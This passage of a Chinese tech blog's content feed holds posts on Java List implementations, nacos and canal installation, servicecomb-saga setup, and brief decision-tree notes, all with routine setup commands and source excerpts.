class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">        last = prev;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        next.prev = prev;</span><br><span class="line">        x.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    x.item = <span class="keyword">null</span>;</span><br><span class="line">    size--;</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">    checkElementIndex(index);</span><br><span class="line">    Node&lt;E&gt; x = node(index);</span><br><span class="line">    E oldVal = x.item;</span><br><span class="line">    x.item = element;</span><br><span class="line">    <span class="keyword">return</span> oldVal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里还有一个Node node(int index); 这个主要是用来查询指定index的元素，时间复杂度为O(logn)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// assert isElementIndex(index);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">        Node&lt;E&gt; x = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">            x = x.next;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Node&lt;E&gt; x = last;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">            x = x.prev;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>从这里我们可以得出以下结论</strong></p>
<ol>
<li>ArrayList访问指定index的元素要比LinkedList快，看下面代码</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList访问指定index的元素</span><br><span class="line">elementData[index]</span><br><span class="line">LinkedList访问指定index的元素</span><br><span class="line">node(index)</span><br></pre></td></tr></table></figure>
<h2 id="Vector实现"><a href="#Vector实现" class="headerlink" title="Vector实现"></a>Vector实现</h2><p>Vector则是在ArrayList的基础上所有方法增加了synchronized关键字，是线程安全的集合。</p>
<h2 id="CopyOnWriteArrayList实现"><a href="#CopyOnWriteArrayList实现" class="headerlink" title="CopyOnWriteArrayList实现"></a>CopyOnWriteArrayList实现</h2><p>从名字可以看出CopyOnWriteArrayList的底层实现采用的数组，因为也是ArrayList。这个集合类也是线程安全的，那么我们来看看它是如何实现线程安全的。</p>
<p>首先在该类中增加了可重入锁</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">transient</span> ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array; <span class="comment">// 数据存储</span></span><br></pre></td></tr></table></figure>
<p>依旧，我们看看构造器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CopyOnWriteArrayList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setArray(<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CopyOnWriteArrayList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    Object[] elements;</span><br><span class="line">    <span class="keyword">if</span> (c.getClass() == CopyOnWriteArrayList.class)</span><br><span class="line">        elements = ((CopyOnWriteArrayList&lt;?&gt;)c).getArray();</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        elements = c.toArray();</span><br><span class="line">        <span class="comment">// c.toArray might (incorrectly) not return Object[] (see 6260652)</span></span><br><span class="line">        <span class="keyword">if</span> (elements.getClass() != Object[].class)</span><br><span class="line">            elements = Arrays.copyOf(elements, elements.length, Object[].class);</span><br><span class="line">    &#125;</span><br><span class="line">    setArray(elements);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CopyOnWriteArrayList</span><span class="params">(E[] toCopyIn)</span> </span>&#123;</span><br><span class="line">    setArray(Arrays.copyOf(toCopyIn, toCopyIn.length, Object[].class));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setArray</span><span class="params">(Object[] a)</span> </span>&#123;</span><br><span class="line">    array = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述构造器完成的就是array的初始化。</p>
<p>我们来看看是如何做到添加和获取做到线程安全的。</p>
<p>首先我们看看add方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">this</span>.lock;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="keyword">int</span> len = elements.length;</span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到，在添加新元素的时候会采用lock锁住当前方法。然后进行copy元素到新的数组中。</p>
<p>包括set，remove都进行了lock操作。</p>
<p>我们再看看get方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> get(getArray(), index);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> E <span class="title">get</span><span class="params">(Object[] a, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (E) a[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到没有，这里可没有加锁哦。我们再Vector中可以使用了synchronized关键字的。我们看看Vector的get。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &gt;= elementCount)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ArrayIndexOutOfBoundsException(index);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> elementData(index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在CopyOnWriteArrayList的get没有加锁是因为set的原因，在set的时候。每次都会生成一个新的数组，所以get时不用加锁。</p>
<p><strong>这里可以看出CopyOnWriteArrayList的写性能应该不会太高。因为每次都要生成新的数组。</strong></p>
<p>最后看看有哪些List是线程安全的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 使用CopyOnWriteArrayList</span><br><span class="line"><span class="number">2</span>. Collections.synchronizedList(<span class="keyword">new</span> ArrayList())</span><br><span class="line"><span class="number">3</span>. 使用Vector</span><br></pre></td></tr></table></figure>
<p>好了，今天的分享就到这里啦。谢谢你的阅读，喜欢的话，可以打赏一下哦。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[nacos集群安装]]></title>
      <url>/2019/nacos-cluster-install-md/</url>
      <content type="html"><![CDATA[<p>nacos 1.0.0-RC 伪集群部署</p>
<ol>
<li><p>准备机器</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标主机IP 192.168.1.100</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载nacos</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /opt/softwares</span><br><span class="line">cd /opt/softwares</span><br><span class="line">wget https://github.com/alibaba/nacos/releases/download/1.0.0-RC2/nacos-server-1.0.0-RC2.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压缩</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf /opt/softwares/nacos-server-1.0.0-RC2.tar.gz -C /opt/</span><br></pre></td></tr></table></figure>
</li>
<li><p>准备MYSQL数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建数据库 nacos</span><br><span class="line">执行 nacos-mysql.sql</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/nacos</span><br><span class="line">vim conf/application.properties</span><br><span class="line">1. 修改application配置</span><br><span class="line">server.port=8847</span><br><span class="line">db.num=1</span><br><span class="line">db.url.0=jdbc:mysql://192.168.1.100:3306/nacos?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true</span><br><span class="line">db.user=root</span><br><span class="line">db.password=123456</span><br><span class="line">vim conf/cluster.conf</span><br><span class="line">2. 修改cluster.conf配置</span><br><span class="line">cd /opt/nacos/conf</span><br><span class="line">echo &apos;&apos;&gt; cluster.conf</span><br><span class="line">vim cluster.conf</span><br><span class="line">192.168.1.100:8847</span><br><span class="line">192.168.1.100:8848</span><br><span class="line">192.168.1.100:8849</span><br><span class="line">3. startup.sh</span><br><span class="line">vim bin/startup.sh</span><br><span class="line">【可选】82行 修改JVM启动参数，正式环境默认就行。</span><br></pre></td></tr></table></figure>
</li>
<li><p>复制nacos</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/</span><br><span class="line">mv nacos nacos-8847</span><br><span class="line">cp -r nacos-8847 nacos-8848</span><br><span class="line">cp -r nacos-8847 nacos-8849</span><br><span class="line">修改startup.sh</span><br><span class="line">104行 修改address端口</span><br><span class="line">vim nacos-8847/bin/startup.sh</span><br><span class="line">search /address=8000修改为8857</span><br><span class="line">vim nacos-8847/conf/application.properties</span><br><span class="line">server.port=8847</span><br><span class="line">vim nacos-8848/bin/startup.sh</span><br><span class="line">search /address=8000修改为8858</span><br><span class="line">vim nacos-8848/conf/application.properties</span><br><span class="line">server.port=8848</span><br><span class="line">vim nacos-8849/bin/startup.sh</span><br><span class="line">search /address=8000修改为8859</span><br><span class="line">vim nacos-8849/conf/application.properties</span><br><span class="line">server.port=8849</span><br><span class="line">保证以上端口不能被占用</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.100:8849/nacos</span><br><span class="line">用户名:nacos</span><br><span class="line">密码:nacos</span><br></pre></td></tr></table></figure>
</li>
<li><p>真实集群把相应的目录拷贝到不同的机器，然后修改cluster.conf文件为对应的ip就OK</p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> nacos </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[决策树]]></title>
      <url>/2019/decision_tree/</url>
      <content type="html"><![CDATA[<h1 id="决策树"><a href="#决策树" class="headerlink" title="决策树"></a>决策树</h1><a id="more"></a>
<script type="math/tex; mode=display">
熵=-\sum_{i=1}^Np(i)log_2{p(i)}</script><script type="math/tex; mode=display">
Gini系数=Gini(p)=\sum_{k=1}^kp_k(1-p_k)=1-\sum_{k=1}^kp_k^2</script><p>熵越大，集合中的元素分类越多。</p>
<p>Gini系统与熵表达的意思一样。</p>
<h1 id="Xgboost"><a href="#Xgboost" class="headerlink" title="Xgboost"></a>Xgboost</h1><script type="math/tex; mode=display">
y_i=\sum_jw_jx_{ij}</script><ol>
<li><p>回归算法</p>
</li>
<li><p>决策树与随机森林</p>
</li>
<li>贝叶斯算法</li>
<li>Xgboost</li>
<li>支持向量机</li>
<li>时间序列</li>
<li>神经网络</li>
<li>PCA降维</li>
<li>聚类算法</li>
<li>推荐系统</li>
<li>word2vec</li>
</ol>
]]></content>
      
        <categories>
            
            <category> ml </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ml </tag>
            
            <tag> 机器学习 </tag>
            
            <tag> 决策树 </tag>
            
            <tag> xgboost </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[servicecomb-saga omega分析]]></title>
      <url>/2018/servicecomb-saga-1/</url>
      <content type="html"><![CDATA[<p>在微服务热火朝天的时代，分布式事务变的更加急迫，那么如果解决分布式事务是一个一直以来的难题，今天我们来介绍一个保证最终一致性的分布式事务的框架servicecomb-saga。</p>
<a id="more"></a>
<h2 id="alpha安装"><a href="#alpha安装" class="headerlink" title="alpha安装"></a>alpha安装</h2><ol>
<li><p>下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/servicecomb-saga.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果使用mysql作为alpha的db，那么修改配置文件alpha/alpha-server/pom.xml</span><br><span class="line">在&lt;/dependencies&gt;之前添加如下依赖</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">mvn clean install -DskipTests -Pspring-boot-2</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改alpha配置文件</p>
<ol>
<li><p>创建数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">进入数据库命令行</span><br><span class="line">create database `saga` charset utf8 collate utf8_general_ci;</span><br><span class="line">create user &apos;saga&apos;@&apos;%&apos; identified by &apos;password&apos;;</span><br><span class="line">grant all on saga.* to &apos;saga&apos;@&apos;%&apos; with grant option;</span><br><span class="line">flush privileges;</span><br><span class="line">执行alpha/alpha-server/...resource下的sql文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动alpha</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -D&quot;spring.profiles.active=mysql&quot;</span><br><span class="line">-D&quot;spring.datasource.url=jdbc:mysql://localhost:3306/saga?useSSL=false&quot;</span><br><span class="line">-D&quot;spring.datasource.username=saga&quot;</span><br><span class="line">-D&quot;spring.datasource.password=password&quot;</span><br><span class="line">-D&quot;alpha.server.port=7080&quot;</span><br><span class="line">-D&quot;server.port=7090&quot;</span><br><span class="line">-jar alpha-server-0.3.0-SNAPSHOT-exec.jar &gt;./run.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改应用程序配置</p>
<p>在Application上增加@EnableOmega，在application配置文件中增加alpha.cluster.address=localhost:7080</p>
</li>
</ol>
</li>
</ol>
<h2 id="omega分析"><a href="#omega分析" class="headerlink" title="omega分析"></a>omega分析</h2><p>   这里有几个重要的类，SagaStartAspect，OmegaContext，TransactionAspect，Compensable，TransactionHandlerInterceptor</p>
<p>   让我们看看流程图。</p>
<p>   <img src="https://wx3.sinaimg.cn/large/afc434bdly1fxaa43b6ykj20rx0ncjto.jpg" alt=""></p>
<p>   知识有限，如有错误之处敬请谅解。</p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> saga </tag>
            
            <tag> 分布式事务 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[canal快速开始]]></title>
      <url>/2018/canal-quickstart/</url>
      <content type="html"><![CDATA[<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>服务端ip：192.168.1.101</p>
<ol>
<li><p>下载canal 到/opt/softwares</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/alibaba/canal/releases/download/canal-1.0.26-preview-2/canal.deployer-1.0.26-SNAPSHOT.tar.gz</span><br></pre></td></tr></table></figure>
</li>
</ol>
<a id="more"></a>
<ol>
<li><p>解压缩</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /opt/canal &amp;&amp; tar -zxvf canal.deployer-1.0.26-SNAPSHOT.tar.gz -C /opt/canal/</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置mysql</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/my.cnf</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">log-bin=mysql-bin</span><br><span class="line">binlog-format=ROW</span><br><span class="line">server_id=1</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE USER canal IDENTIFIED BY &apos;canal&apos;;</span><br><span class="line">GRANT SELECT, REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &apos;canal&apos;@&apos;%&apos;;</span><br><span class="line">-- GRANT ALL PRIVILEGES ON *.* TO &apos;canal&apos;@&apos;%&apos;;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE IF NOT EXISTS canal_tsdb default charset utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置canal</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /opt/canal/conf/example/instance.properties /opt/canal/conf/example/instance.properties.bak</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">vim /opt/canal/conf/example/instance.properties</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>################################################</span><br><span class="line"><span class="meta">#</span># mysql serverId</span><br><span class="line">canal.instance.mysql.slaveId=0</span><br><span class="line"><span class="meta">#</span> position info</span><br><span class="line">canal.instance.master.address=127.0.0.1:3306</span><br><span class="line">canal.instance.master.journal.name=mysql-bin.000001</span><br><span class="line">canal.instance.master.position=12172</span><br><span class="line">canal.instance.master.timestamp=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> table meta tsdb info</span><br><span class="line">canal.instance.tsdb.enable=true</span><br><span class="line"><span class="meta">#</span>canal.instance.tsdb.dir=$&#123;canal.file.data.dir:../conf&#125;/$&#123;canal.instance.destination:&#125;</span><br><span class="line"><span class="meta">#</span>canal.instance.tsdb.url=jdbc:h2:$&#123;canal.instance.tsdb.dir&#125;/h2;CACHE_SIZE=1000;MODE=MYSQL;</span><br><span class="line">canal.instance.tsdb.url=jdbc:mysql://127.0.0.1:3306/canal_tsdb</span><br><span class="line">canal.instance.tsdb.dbUsername=canal</span><br><span class="line">canal.instance.tsdb.dbPassword=canal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>canal.instance.standby.address =</span><br><span class="line"><span class="meta">#</span>canal.instance.standby.journal.name =</span><br><span class="line"><span class="meta">#</span>canal.instance.standby.position = </span><br><span class="line"><span class="meta">#</span>canal.instance.standby.timestamp = </span><br><span class="line"><span class="meta">#</span> username/password</span><br><span class="line">canal.instance.dbUsername=canal</span><br><span class="line">canal.instance.dbPassword=canal</span><br><span class="line">canal.instance.defaultDatabaseName=test</span><br><span class="line">canal.instance.connectionCharset=UTF-8</span><br><span class="line"><span class="meta">#</span> table regex</span><br><span class="line">canal.instance.filter.regex=.*\\..*</span><br><span class="line"><span class="meta">#</span> table black regex</span><br><span class="line">canal.instance.filter.black.regex=</span><br><span class="line"><span class="meta">#</span>################################################</span><br></pre></td></tr></table></figure>
<p>修改canal.properties</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim /opt/canal/conf/canal.properties</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>canal.instance.tsdb.spring.xml=classpath:spring/tsdb/h2-tsdb.xml</span><br><span class="line">canal.instance.tsdb.spring.xml=classpath:spring/tsdb/mysql-tsdb.xml</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 找到tsdb的配置，注释上面的配置，启用下面的配置</span><br></pre></td></tr></table></figure>
<p>​</p>
</li>
<li><p>启动canal</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh /opt/canal/bin/startup.sh</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><ol>
<li><p>引入依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.otter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal.client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.23<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>客户端启动类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 